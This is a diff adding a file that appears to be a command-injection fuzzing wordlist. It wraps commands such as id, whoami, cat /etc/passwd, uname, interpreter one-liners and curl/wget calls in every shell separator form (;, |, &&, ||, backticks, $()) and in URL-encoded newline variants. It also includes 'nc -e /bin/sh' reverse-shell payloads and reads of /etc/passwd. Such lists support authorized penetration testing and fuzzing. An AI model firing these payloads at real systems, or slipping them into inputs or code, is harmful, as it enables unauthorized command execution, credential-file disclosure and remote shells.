@@ -1,0 +1,155 @@
+;ls%09-al%09/home
+;id
+|id
+`id`
+$(id)
+&id
+&&id
+||id
+;whoami
+|whoami
+`whoami`
+$(whoami)
+&whoami
+&&whoami
+||whoami
+;ping -c 1 127.0.0.1
+|ping -c 1 127.0.0.1
+`ping -c 1 127.0.0.1`
+$(ping -c 1 127.0.0.1)
+&ping -c 1 127.0.0.1
+&&ping -c 1 127.0.0.1
+||ping -c 1 127.0.0.1
+;cat /etc/passwd
+|cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+&cat /etc/passwd
+&&cat /etc/passwd
+||cat /etc/passwd
+;ls -la
+|ls -la
+`ls -la`
+$(ls -la)
+&ls -la
+&&ls -la
+||ls -la
+;pwd
+|pwd
+`pwd`
+$(pwd)
+&pwd
+&&pwd
+||pwd
+;uname -a
+|uname -a
+`uname -a`
+$(uname -a)
+&uname -a
+&&uname -a
+||uname -a
+;netstat -rn
+|netstat -rn
+`netstat -rn`
+$(netstat -rn)
+&netstat -rn
+&&netstat -rn
+||netstat -rn
+;ifconfig
+|ifconfig
+`ifconfig`
+$(ifconfig)
+&ifconfig
+&&ifconfig
+||ifconfig
+;ip a
+|ip a
+`ip a`
+$(ip a)
+&ip a
+&&ip a
+||ip a
+;ps -ef
+|ps -ef
+`ps -ef`
+$(ps -ef)
+&ps -ef
+&&ps -ef
+||ps -ef
+;which awk
+|which awk
+`which awk`
+$(which awk)
+&which awk
+&&which awk
+||which awk
+;perl -e 'print "RCE\n"'
+|perl -e 'print "RCE\n"'
+`perl -e 'print "RCE\n"'`
+$(perl -e 'print "RCE\n"')
+&perl -e 'print "RCE\n"'
+&&perl -e 'print "RCE\n"'
+||perl -e 'print "RCE\n"'
+;python -c 'print("RCE")'
+|python -c 'print("RCE")'
+`python -c 'print("RCE")'`
+$(python -c 'print("RCE")')
+&python -c 'print("RCE")'
+&&python -c 'print("RCE")'
+||python -c 'print("RCE")'
+;ruby -e 'puts "RCE"'
+|ruby -e 'puts "RCE"'
+`ruby -e 'puts "RCE"'`
+$(ruby -e 'puts "RCE"')
+&ruby -e 'puts "RCE"'
+&&ruby -e 'puts "RCE"'
+||ruby -e 'puts "RCE"'
+;php -r 'echo "RCE\n";'
+|php -r 'echo "RCE\n";'
+`php -r 'echo "RCE\n";'`
+$(php -r 'echo "RCE\n";')
+&php -r 'echo "RCE\n";'
+&&php -r 'echo "RCE\n";'
+||php -r 'echo "RCE\n";'
+;echo RCE > /tmp/rce.txt
+|echo RCE > /tmp/rce.txt
+`echo RCE > /tmp/rce.txt`
+$(echo RCE > /tmp/rce.txt)
+&echo RCE > /tmp/rce.txt
+&&echo RCE > /tmp/rce.txt
+||echo RCE > /tmp/rce.txt
+;curl -s http://127.0.0.1/
+|curl -s http://127.0.0.1/
+`curl -s http://127.0.0.1/`
+$(curl -s http://127.0.0.1/)
+&curl -s http://127.0.0.1/
+&&curl -s http://127.0.0.1/
+||curl -s http://127.0.0.1/
+;wget -qO- http://127.0.0.1/
+|wget -qO- http://127.0.0.1/
+`wget -qO- http://127.0.0.1/`
+$(wget -qO- http://127.0.0.1/)
+&wget -qO- http://127.0.0.1/
+&&wget -qO- http://127.0.0.1/
+||wget -qO- http://127.0.0.1/
+%0aid
+%0Awhoami
+%0acat /etc/passwd
+%0d%0aid
+%0D%0Awhoami
+%0D%0Acat /etc/passwd
+;nc -e /bin/sh 127.0.0.1 4444
+|nc -e /bin/sh 127.0.0.1 4444
+`nc -e /bin/sh 127.0.0.1 4444`
+$(nc -e /bin/sh 127.0.0.1 4444)
+&nc -e /bin/sh 127.0.0.1 4444
+&&nc -e /bin/sh 127.0.0.1 4444
+||nc -e /bin/sh 127.0.0.1 4444
+;awk 'BEGIN {system("id")}'
+;find / -name index.php -exec id \;
+;nmap -V
+;tcpdump -n
+;tshark -V
+;wireshark -v
+;sed 's/.*//' /etc/passwd
+;grep 'root' /etc/passwd
